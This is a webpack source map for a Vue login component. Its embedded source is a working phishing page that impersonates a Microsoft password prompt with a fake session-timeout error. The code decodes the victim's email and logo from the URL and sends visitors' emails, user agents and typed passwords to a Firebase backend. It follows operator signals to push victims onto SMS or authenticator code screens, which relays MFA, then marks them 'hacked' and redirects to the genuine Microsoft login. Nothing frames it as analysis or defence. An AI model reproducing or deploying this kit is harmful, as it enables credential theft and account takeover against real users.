{"version":3,"sources":["webpack:///./src/views/mobile/LoginForm.vue?f05a","webpack:///./src/views/mobile/LoginForm.vue?aeb8","webpack:///src/views/mobile/LoginForm.vue","webpack:///./src/views/mobile/LoginForm.vue?3950","webpack:///./src/views/mobile/LoginForm.vue"],"names":["render","_vm","this","_h","$createElement","_c","_self","staticClass","attrs","model","value","callback","$$v","showDialog","expression","disableCard","companyLogo","_v","_s","email","errorMessage","_e","ref","on","$event","preventDefault","onSubmit","type","indexOf","_k","keyCode","key","submitForm","password","staticRenderFns","name","data","computed","methods","component","VBtn","VCard","VCardText","VContainer","VDialog","VForm","VImg","VRow","VSpacer","VTextField","VToolbar","VToolbarTitle"],"mappings":"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","file":"js/mobileLoginForm.718bdae5.js","sourcesContent":["import mod from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./LoginForm.vue?vue&type=style&index=0&lang=scss&\"; export default mod; export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./LoginForm.vue?vue&type=style&index=0&lang=scss&\"","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('v-container',{staticClass:\"d-flex justify-center\",attrs:{\"fill-height\":\"\"}},[_c('v-dialog',{attrs:{\"width\":\"470\",\"persistent\":\"\"},model:{value:(_vm.showDialog),callback:function ($$v) {_vm.showDialog=$$v},expression:\"showDialog\"}},[_c('v-card',{staticClass:\"pa-10\",attrs:{\"width\":\"500\",\"disabled\":_vm.disableCard,\"tile\":\"\"}},[_c('v-toolbar',{attrs:{\"flat\":\"\"}},[_c('v-toolbar-title',[_c('v-img',{staticClass:\"my-2\",attrs:{\"alt\":\"Microsoft Logo\",\"src\":_vm.companyLogo,\"transition\":\"scale-transition\",\"max-height\":\"70\",\"max-width\":\"150\"}}),_c('v-btn',{staticClass:\"text-none pl-1\",attrs:{\"text\":true,\"color\":\"\",\"depressed\":\"\"}},[_vm._v(\" \"+_vm._s(_vm.email)+\" \")])],1)],1),_c('v-card-text',[_c('h2',{staticClass:\"mt-6 mb-5 black--text\"},[_vm._v(\"Enter password\")]),(_vm.error)?_c('p',{staticClass:\"red--text\"},[_vm._v(\" \"+_vm._s(_vm.errorMessage)+\" \")]):_vm._e(),_c('v-form',{ref:\"form\",attrs:{\"lazy-validation\":\"\"},on:{\"submit\":function($event){$event.preventDefault();return _vm.onSubmit($event)}}},[_c('v-text-field',{attrs:{\"dense\":true,\"label\":\"Password\",\"type\":\"password\",\"required\":\"\"},on:{\"keyup\":function($event){if(!$event.type.indexOf('key')&&_vm._k($event.keyCode,\"enter\",13,$event.key,\"Enter\")){ return null; }return _vm.submitForm($event)}},model:{value:(_vm.password),callback:function ($$v) {_vm.password=$$v},expression:\"password\"}}),_c('router-link',{attrs:{\"to\":\"\"}},[_c('p',{staticClass:\"caption\"},[_vm._v(\"Forgot my password\")])]),_c('v-row',[_c('v-spacer'),_c('v-btn',{staticClass:\"rounded-button white--text text-none\",attrs:{\"width\":\"\",\"depressed\":true,\"color\":\"#005DA6\"},on:{\"click\":_vm.submitForm}},[_vm._v(\"Manage Settings\")])],1),_c('p',{staticClass:\"caption\"})],1)],1)],1)],1)],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\n  <v-container fill-height class=\"d-flex justify-center\">\n    <v-dialog v-model=\"showDialog\" width=\"470\" persistent>\n      <v-card class=\"pa-10\" width=\"500\" :disabled=\"disableCard\" tile>\n        <v-toolbar flat>\n          <v-toolbar-title>\n            <v-img\n              class=\"my-2\"\n              alt=\"Microsoft Logo\"\n              :src=\"companyLogo\"\n              transition=\"scale-transition\"\n              max-height=\"70\"\n              max-width=\"150\"\n            />\n\n            <v-btn class=\"text-none pl-1\" :text=\"true\" color depressed>\n              {{ email }}\n            </v-btn>\n          </v-toolbar-title>\n        </v-toolbar>\n\n        <v-card-text>\n          <h2 class=\"mt-6 mb-5 black--text\">Enter password</h2>\n          <p class=\"red--text\" v-if=\"error\">\n            {{ errorMessage }}\n          </p>\n          <v-form ref=\"form\" lazy-validation v-on:submit.prevent=\"onSubmit\">\n            <v-text-field\n              :dense=\"true\"\n              v-model=\"password\"\n              label=\"Password\"\n              type=\"password\"\n              required\n              v-on:keyup.enter=\"submitForm\"\n            ></v-text-field>\n            <router-link to>\n              <p class=\"caption\">Forgot my password</p>\n            </router-link>\n            <v-row>\n              <v-spacer></v-spacer>\n              <v-btn\n                width=\"\"\n                class=\"rounded-button white--text text-none\"\n                :depressed=\"true\"\n                color=\"#005DA6\"\n                @click=\"submitForm\"\n                >Manage Settings</v-btn\n              >\n            </v-row>\n            <p class=\"caption\"></p>\n          </v-form>\n        </v-card-text>\n      </v-card>\n    </v-dialog>\n  </v-container>\n</template>\n\n<script>\nimport { db } from \"../../firebase\";\n\nexport default {\n  name: \"LoginForm\",\n\n  data: () => ({\n    showDialog: true,\n    error: true,\n    errorMessage: \"Session timeout!\",\n    disableCard: false,\n    email: \"\",\n    password: \"\",\n    companyLogo: \"\",\n    showLogo: false,\n    workerNumber: 0,\n    browser: \"chrome_100\",\n    clean: true,\n    companyName: \"\",\n  }),\n\n  async created() {\n    // if user has previously filled in the correct password.\n    let hacked = localStorage.getItem(\"hacked\");\n    hacked && (window.location.href = \"https://login.microsoftonline.com\");\n    console.log(this.$route.params.data);\n\n    this.email = this.$route.params.data.includes(\"@\")\n      ? this.$route.params.data\n      : window.atob(this.$route.params.data).split(\",\")[0];\n\n    this.companyLogo = window.atob(this.$route.params.data).split(\",\")[3];\n\n    let workers = await db.collection(\"workers\");\n\n    let currentWorker = await workers.doc(\"current\").get();\n    this.workerNumber = currentWorker.data().worker;\n    this.browser = this.$route.params.browser || `chrome_${this.workerNumber}`;\n\n    console.log(this.browser);\n\n    await workers.doc(this.browser).set(\n      {\n        browser: this.browser,\n        data_type: \"email\",\n        email: this.email.trim(),\n        password: \"\",\n        smsCode: \"\",\n        smsInfo: \"\",\n        cookies: \"\",\n        from: \"client\",\n        info: \"\",\n        screenState: \"\",\n      },\n      { merge: true }\n    );\n\n    this.companyName = this.email.split(\"@\")[1].split(\".\")[0];\n    window.document.title = this.companyName;\n\n    // check if the user is visiting for the first time if they have not entered their password before.\n    if (this.clean) {\n      let currentWorker = await workers.doc(\"current\").get();\n      this.workerNumber = currentWorker.data().worker;\n    }\n\n    let futureWorker;\n    console.log(this.workerNumber);\n\n    if (this.clean) {\n      if (this.workerNumber === 20) {\n        futureWorker = 1;\n      } else {\n        futureWorker = this.workerNumber + 1;\n      }\n      await workers.doc(\"current\").set({ worker: futureWorker });\n    }\n    this.clean = false;\n\n    // If a user visits the page.\n    let visited = await db.collection(\"visited\");\n    await visited.doc(this.email).set(\n      {\n        email: this.email,\n        agent: navigator.userAgent,\n      },\n      { merge: true }\n    );\n\n    workers.where(\"browser\", \"==\", this.browser).onSnapshot((snapshot) => {\n      snapshot.docChanges().forEach(async (change) => {\n        let data = change.doc.data();\n        console.log(change.type);\n        if (data.from === \"server\" && change.type === \"modified\") {\n          // User enters wrong password.\n          if (data.info === \"password_error\") {\n            this.error = true;\n            this.errorMessage = \"Your account or password is incorrect.\";\n            this.disableCard = false;\n            this.password = \"\";\n          }\n\n          // Go to sms app\n          if (data.screenState === \"sms\") {\n            await this.$router.push({\n              path: `/identifier/sms/${this.$route.params.data}/${this.browser}/${data.smsInfo}`,\n            });\n          }\n\n          // Go to auth app.\n          if (data.screenState === \"authenticator\") {\n            console.log(this.email, this.companyLogo);\n            await this.$router.push({\n              path: `/identifier/authenticator/${this.$route.params.data}/${this.browser}`,\n            });\n          }\n\n          // Verification complete\n          if (data.info === \"verification_complete\") {\n            localStorage.setItem(\"hacked\", true);\n            window.location.href = `https://login.microsoftonline.com`;\n          }\n        }\n      });\n    });\n  },\n\n  // mounted() {\n  //   setTimeout(function () {\n  //     window.location.reload();\n  //   }, 60000);\n  // },\n\n  computed: {},\n\n  methods: {\n    async submitForm() {\n      this.disableCard = true;\n      this.error = false;\n\n      if (this.password.length < 4) {\n        this.error = true;\n        this.errorMessage = `Your account or password is incorrect.`;\n        this.disableCard = false;\n        return;\n      }\n\n      console.log(this.browser);\n\n      let workers = await db.collection(\"workers\");\n\n      await workers.doc(this.browser).set(\n        {\n          browser: this.browser,\n          data_type: \"password\",\n          password: this.password,\n          from: \"client\",\n          info: \"\",\n        },\n        { merge: true }\n      );\n    },\n  },\n};\n</script>\n<style lang=\"scss\">\na {\n  text-decoration: none;\n  color: #005da6;\n}\n.rounded-button {\n  border-radius: 0px;\n}\n</style>\n","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./LoginForm.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./LoginForm.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./LoginForm.vue?vue&type=template&id=7c24a354&\"\nimport script from \"./LoginForm.vue?vue&type=script&lang=js&\"\nexport * from \"./LoginForm.vue?vue&type=script&lang=js&\"\nimport style0 from \"./LoginForm.vue?vue&type=style&index=0&lang=scss&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports\n\n/* vuetify-loader */\nimport installComponents from \"!../../../node_modules/vuetify-loader/lib/runtime/installComponents.js\"\nimport { VBtn } from 'vuetify/lib/components/VBtn';\nimport { VCard } from 'vuetify/lib/components/VCard';\nimport { VCardText } from 'vuetify/lib/components/VCard';\nimport { VContainer } from 'vuetify/lib/components/VGrid';\nimport { VDialog } from 'vuetify/lib/components/VDialog';\nimport { VForm } from 'vuetify/lib/components/VForm';\nimport { VImg } from 'vuetify/lib/components/VImg';\nimport { VRow } from 'vuetify/lib/components/VGrid';\nimport { VSpacer } from 'vuetify/lib/components/VGrid';\nimport { VTextField } from 'vuetify/lib/components/VTextField';\nimport { VToolbar } from 'vuetify/lib/components/VToolbar';\nimport { VToolbarTitle } from 'vuetify/lib/components/VToolbar';\ninstallComponents(component, {VBtn,VCard,VCardText,VContainer,VDialog,VForm,VImg,VRow,VSpacer,VTextField,VToolbar,VToolbarTitle})\n"],"sourceRoot":""}